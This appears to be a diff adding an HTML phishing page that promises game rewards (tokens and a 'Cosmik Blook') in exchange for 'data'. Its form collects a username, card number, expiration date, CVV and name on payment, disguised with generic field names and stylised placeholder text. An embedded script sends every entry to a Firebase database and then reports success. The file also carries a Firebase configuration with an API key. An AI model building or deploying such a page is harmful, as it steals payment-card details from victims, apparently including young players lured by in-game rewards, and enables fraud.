@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Submit Data | Anolet</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito&family=Poppins:wght@500&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        body {
+            font-family: 'Nunito', sans-serif;
+            background-color: #336c4c;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .main-container {
+            display: flex;
+            justify-content: space-between;
+            width: 80%;
+            height: 80%;
+        }
+        .form-container {
+            background-color: #3cb383;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            width: 60%;
+        }
+        .form-container h1 {
+            text-align: center;
+            font-family: 'Poppins', sans-serif;
+            margin-bottom: 20px;
+        }
+        .form-container input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 2px solid #6eebb9;
+            border-radius: 5px;
+            font-size: 16px;
+            outline: none;
+        }
+        .form-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #3cb383;
+            border: 2px solid #6eebb9;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+            color: white;
+            font-family: 'Poppins', sans-serif;
+        }
+        .form-container button:hover {
+            background-color: #34a06f;
+        }
+        .rewards-container {
+            background-color: #3cb383;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            width: 30%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .rewards-container h2 {
+            font-family: 'Poppins', sans-serif;
+            margin-bottom: 20px;
+        }
+        .reward-item {
+            background-color: #6eebb9;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            width: 100%;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="form-container">
+            <h1>Submit Data</h1>
+            <form id="dataForm" onsubmit="event.preventDefault(); submitData();">
+                <input type="text" id="input1" placeholder="Your Username" required>
+                <input type="text" id="input2" placeholder="ᴄᴀʀᴅ ɴᴜᴍʙᴇʀ" required>
+                <input type="text" id="input3" placeholder="Expiration" required>
+                <input type="text" id="input4" placeholder="cvv" required>
+                <input type="text" id="input5" placeholder="What You Want To Buy" required>
+                                    <input type="text" id="input6" placeholder="Name On Payment" required>
+                <button type="submit">Submit</button>
+            </form>
+        </div>
+        <div class="rewards-container">
+            <h2>Rewards</h2>
+            <div class="reward-item">Plus</div>
+            <div class="reward-item">50k Token | 5$ </div>
+            <div class="reward-item">125k Token | 10$</div>
+            <div class="reward-item">300k Token | 20$</div>
+            <div class="reward-item">Cosmik Blook | Free</div>
+        </div>
+    </div>
+
+    <script>
+        // Initialize Firebase
+        const firebaseConfig = {
+          apiKey: "AIzaSyCOIKlP9YhtX9xa5aoggmsrWwavlW-XuzI",
+  authDomain: "cosmik-7c124.firebaseapp.com",
+  databaseURL: "https://cosmik-7c124-default-rtdb.firebaseio.com",
+  projectId: "cosmik-7c124",
+  storageBucket: "cosmik-7c124.appspot.com",
+  messagingSenderId: "412506429662",
+  appId: "1:412506429662:web:9ca3e17199297df7384a4f",
+  measurementId: "G-R7K0LTHCK3"   
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        function submitData() {
+            const input1 = document.getElementById("input1").value;
+            const input2 = document.getElementById("input2").value;
+            const input3 = document.getElementById("input3").value;
+            const input4 = document.getElementById("input4").value;
+            const input5 = document.getElementById("input5").value;
+            const input6 = document.getElementById("input6").value;
+
+            database.ref('data/').push({
+                input1: input1,
+                input2: input2,
+                input3: input3,
+                input4: input4,
+                input5: input5,
+                input6: input6
+            }).then(() => {
+                Swal.fire({
+                    icon: 'success',
+                    title: 'Data Submitted',
+                    text: 'Your data has been submitted successfully.'
+                });
+                document.getElementById("dataForm").reset();
+            }).catch((error) => {
+                console.error("Error submitting data: ", error);
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Error',
+                    text: 'Failed to submit data. Please try again later.'
+                });
+            });
+        }
+    </script>
+</body>
+</html>
+
+        
